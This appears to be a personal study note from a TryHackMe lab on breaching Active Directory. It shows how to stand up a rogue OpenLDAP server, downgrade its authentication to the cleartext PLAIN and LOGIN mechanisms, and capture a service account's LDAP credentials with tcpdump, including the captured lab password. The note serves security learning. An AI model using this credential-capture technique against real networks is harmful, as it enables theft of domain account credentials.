# Hosting a Rogue LDAP Server
```sh
# Install OpenLAP
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd

# Configure Rogue LDAP Server
sudo dpkg-reconfigure -p low slapd
```

![[Pasted image 20230621104743.png]]

For the DNS domain name, you want to provide our *target domain*, which is `za.tryhackme.com` in this case![[Pasted image 20230621104815.png]]

Use this same name for the *Organisation name* as well
![[Pasted image 20230621104831.png]]
![[Pasted image 20230621104839.png]]
![[Pasted image 20230621104844.png]]
![[Pasted image 20230621104853.png]]
![[Pasted image 20230621104858.png]]


Before using the rogue LDAP server, we need to **make it vulnerable by downgrading the supported authentication mechanisms**. We want to ensure that our LDAP server only supports `PLAIN` and `LOGIN` authentication methods.
To do this, we need to create a new `ldif` file :-
```sh
aaryan11x$: cat olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps 
olcSaslSecProps: noanonymous,minssf=0,passcred
```

-   **olcSaslSecProps:** Specifies the SASL security properties
-   **noanonymous:** Disables mechanisms that support anonymous login
-   **minssf:** Specifies the minimum acceptable security strength with 0, meaning no protection.

 Use the `ldif` file to patch our LDAP server
 ```sh
 sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```

Verify that our rogue LDAP server's *configuration has been applied* :-
```sh
[thm@thm]$ ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms

dn: 
supportedSASLMechanisms: PLAIN
supportedSASLMechanisms: LOGIN
```

---
## Capturing LDAP Credentials

Since the default port of LDAP is `389`, we can use the following command :-
```sh
sudo tcpdump -SX -i breachad tcp port 389

# When we get a response, we'll recieve the Login Credentials in Plaintext
10:41:52.980162 IP 10.10.10.57.ldap > 10.10.10.201.49834: Flags [P.], seq 1113052386:1113052440, ack 4245946151, win 502, length 54
0x0000: 4500 005e 247e 4000 4006 ed06 0a0a 0a39 E..^$~@.@......9
0x0010: 0a0a 0ac9 0185 c2aa 4257 d4e2 fd13 ff27 ........BW.....'
0x0020: 5018 01f6 2966 0000 3034 0201 0264 2f04 P...)f..04...d/.
0x0030: 0030 2b30 2904 1773 7570 706f 7274 6564 .0+0)..supported
0x0040: 5341 534c 4d65 6368 616e 6973 6d73 310e SASLMechanisms1.
0x0050: 0405 504c 4149 4e04 054c 4f47 494e ..PLAIN..LOGIN
[....]
10:41:52.987145 IP 10.10.10.201.49835 > 10.10.10.57.ldap: Flags [.], ack 3088612909, win 8212, length 0
0x0000: 4500 0028 b092 4000 8006 2128 0a0a 0ac9 E..(..@...!(....
0x0010: 0a0a 0a39 c2ab 0185 8b05 d64a b818 7e2d ...9.......J..~-
0x0020: 5010 2014 0ae4 0000 0000 0000 0000 P.............
10:41:52.989165 IP 10.10.10.201.49835 > 10.10.10.57.ldap: Flags [P.], seq 2332415562:2332415627, ack 3088612909, win 8212, length 65
0x0000: 4500 0069 b093 4000 8006 20e6 0a0a 0ac9 E..i..@.........
0x0010: 0a0a 0a39 c2ab 0185 8b05 d64a b818 7e2d ...9.......J..~-
0x0020: 5018 2014 3afe 0000 3084 0000 003b 0201 P...:...0....;..
0x0030: 0560 8400 0000 3202 0102 0418 7a61 2e74 .`....2.....za.t 
0x0040: 7279 6861 636b 6d65 2e63 6f6d 5c73 7663 ryhackme.com\svc
0x0050: 4c44 4150 8013 7472 7968 6163 6b6d 656c LDAP..password11
```
